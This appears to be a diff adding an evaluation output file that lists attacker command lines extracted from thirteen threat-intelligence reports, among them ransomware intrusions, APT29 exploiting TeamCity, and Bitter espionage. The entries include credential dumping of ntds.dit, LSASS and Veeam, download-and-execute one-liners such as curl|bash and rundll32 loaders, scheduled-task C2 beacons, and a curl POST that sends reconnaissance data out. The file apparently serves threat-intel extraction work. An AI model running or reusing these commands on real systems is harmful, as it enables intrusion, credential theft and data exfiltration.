@@ -1,0 +1,142 @@
+Config Version 650 (Last Eval)
+Total executions: 13
+================================================================================
+
+[602] Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs
+  Commandlines: 11
+--------------------------------------------------------------------------------
+  1. EarthTime.exe
+  2. cmd.exe
+  3. MSBuild.exe
+  4. rundll32.exe WakeWordEngine.dll,Reset
+  5. wmiexec
+  6. AdFind
+  7. SharpHound
+  8. SoftPerfect NetScan
+  9. GT_NET.exe
+  10. WinRAR
+  11. WinSCP
+
+[603] From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira
+  Commandlines: 10
+--------------------------------------------------------------------------------
+  1. systeminfo
+  2. nltest /dclist:
+  3. whoami /groups
+  4. net group domain admins /dom
+  5. wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:"C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY" -quiet
+  6. ssh [email protected] -R *:10400 -p22
+  7. n.exe
+  8. psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"
+  9. rundll32.exe C:\windows\System32\comsvcs.dll, #+000024
+  10. locker.exe
+
+[762] From OneNote to RansomNote: An Ice Cold Intrusion
+  Commandlines: 2
+--------------------------------------------------------------------------------
+  1. powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\programdata\COIm.jpg
+  2. rundll32 c:\programdata\COIm.jpg,init
+
+[1295] Frontline Intelligence: Analysis of UNC1549 TTPs, Custom Tools, and Malware Targeting the Aerospace and Defense Ecosystem | Google Cloud Blog
+  Commandlines: 5
+--------------------------------------------------------------------------------
+  1. GetComputerNameExW(ComputerNameDnsFullyQualified)
+  2. TWOSTROKE
+  3. net user DC-01$ P@ssw0rd
+  4. quser.exe
+  5. wmic.exe
+
+[1474] Malicious Screen Connect Campaign Abuses AI-Themed Lures for Xworm Delivery
+  Commandlines: 4
+--------------------------------------------------------------------------------
+  1. mshta.exe executing a script (IWshShell3.Run(""C:\\Users\\Mguise\\ONEDRI~1\\DOCUME~1\\loadding\\Temp\\X-META~1.BAT" ::", "0".)
+  2. pythonw.exe renamed to pw.exe which runs Base64-encoded command
+  3. reg.exe command used to add the Windows Security value in HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+  4. C:\\xmetavip\\backup.bat
+
+[1296] Microsoft Office Russian Dolls - SANS Internet Storm Center
+  Commandlines: 1
+--------------------------------------------------------------------------------
+  1. IEX CmD.exe /C rundll32 %tmp%\license.ini,IEX A\x12\x0cC
+
+[200] RONINGLOADER: DragonBreath’s New Path to PPL Abuse
+  Commandlines: 10
+--------------------------------------------------------------------------------
+  1. runas
+  2. NtAllocateVirtualMemory
+  3. NtCreateThreadEx
+  4. GetProcAddress
+  5. GetTokenInformation
+  6. CreateFileW
+  7. WriteFile
+  8. CloseHandle
+  9. ZwOpenProcess
+  10. ZwTerminateProcess
+
+[277] September 2025 CVE Landscape
+  Commandlines: 7
+--------------------------------------------------------------------------------
+  1. 7za.exe
+  2. sh.exe
+  3. GoToken.exe
+  4. helper.exe
+  5. dwagent.exe
+  6. main.exe
+  7. 1.vbs
+
+[1292] TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793 | FortiGuard Labs
+  Commandlines: 19
+--------------------------------------------------------------------------------
+  1. whoami
+  2. bash -c "nproc 2>&1"
+  3. cmd.exe "/c whoami"
+  4. cmd.exe "/c ipconfig /all"
+  5. cmd.exe "/c ipconfig /displaydns"
+  6. cmd.exe "/c hostname"
+  7. cmd.exe "/c tasklist /svc"
+  8. cmd.exe "/c netstat -ano"
+  9. cmd.exe "/c net user /domain"
+  10. uname -a
+  11. cmd.exe /c whoami
+  12. cmd.exe /c systeminfo
+  13. cmd.exe /c net user <redacted> "<password redacted>" /add
+  14. cmd.exe "/c echo <redacted> | c:\TeamCity\bin\anydesk.exe --set-password"
+  15. wget --no-check-certificate https[:]//fisheries-states-codes-camps.trycloudflare[.]com/rcu
+  16. /bin/sh -c "(curl -s 194.38.22[.]53/tc.sh||wget -q -O- 194.38.22[.]53/tc.sh)|bash"
+  17. powershell -exec bypass -c "Invoke-WebRequest -Uri hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile C:\Windows\System32\AclNumsInvertHost.dll"
+  18. schtasks.exe /create /SC ONLOGON /tn "\Microsoft\Windows\DefenderUPDService" /tr ""C:\Windows\system32\rundll32.exe" "C:\Windows\system32\AclNumsInvertHost.dll",AclNumsInvertHost"
+  19. schtasks.exe /run /tn "\Microsoft\Windows\DefenderUPDService"
+
+[1294] The Bitter End: Unraveling Eight Years of Espionage Antics—Part One | Proofpoint US
+  Commandlines: 5
+--------------------------------------------------------------------------------
+  1. C:\Windows\System32\conhost.exe --headless cmd /c ping localhost > nul & schtasks /create /tn "EdgeTaskUI" /f /sc minute /mo 16 /tr "conhost --headless powershell -WindowStyle Minimized irm 'woodstocktutors[.]com/jbc.php? fv=$env:COMPUTERNAME*$env:USERNAME' -OutFile 'C:\Users\public\kwe.cc'; Get-Content 'C:\Users\public\kwe.cc' | cmd"
+  2. schtasks /create /tn "Task-S-1-5-42121" /f /sc minute /mo 18 /tr "conhost --headless cmd /v:on /c set gz=ht& set gtz=tps:& set 7gg=!gz!!gtz!& set 6hg=!7gg!//p^rin^ce^cle^anit.co^m& c^ur^l !6hg!/d^prin.p^hp?dr=%computername%;%username%|c^m^d"
+  3. "C:\Windows\System32\cmd.exe" /start min /c schtasks /create /tn "OneDrive\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379" /f /sc minute /mo 19 /tr "conhost --headless cmd /v:on /c set 765=ht& set 665=tp:& set 565=!765!!665!& set 465=!565!//46.229.55[.]63& curl !465!/sv^c^h.p^h^p?li=%computername%..%hostname%c^m^d"
+  4. cd C:\programdata dir > abc1.pdf tasklist >> abc1.pdf wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get >>abc1.pdf wmic logicaldisk get caption >> abc1.pdf systeminfo >> C:\programdata\abc1.pdf curl -X POST -F "file=@C:\programdata\abc1.pdf" <hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%> del abc1.pdf
+  5. curl -o sh2.txt <hxxp://173.254.204[.]72/sh2.txt> copy /b sh1.txt+sh2.txt shh.
+
+[632] Under the Pure Curtain: From RAT to Builder to Coder
+  Commandlines: 2
+--------------------------------------------------------------------------------
+  1. powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new ActiveXObject("MSXML2.XMLHTTP");a.open("GET","63381ba/kcilc.ellrafdlucolc//:sptth".split("").reverse().join(""),0);a.send();eval(a.responseText);';wscript $j"
+  2. cmd /c timeout /t {random_time} >null
+
+[1484] Unveiling a New Variant of the DarkCloud Campaign
+  Commandlines: 3
+--------------------------------------------------------------------------------
+  1. WScript.exe
+  2. powershell -w hidden -noprofile -ep bypass -c
+  3. cmd.exe /C copy *.js C:\Users\Public\Downloads\edriophthalma.js
+
+[68] Velociraptor WSUS Exploitation, Pt. I: WSUS-Up?
+  Commandlines: 5
+--------------------------------------------------------------------------------
+  1. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA==
+  2. C:\Windows\system32\net.exe group "domain computers" /do
+  3. C:\Windows\system32\quser.exe
+  4. C:\Windows\system32\setspn.exe -Q VeeamBackupSVC/*
+  5. C:\Windows\system32\ipconfig.exe /al
+
+================================================================================
+Total commandlines: 84
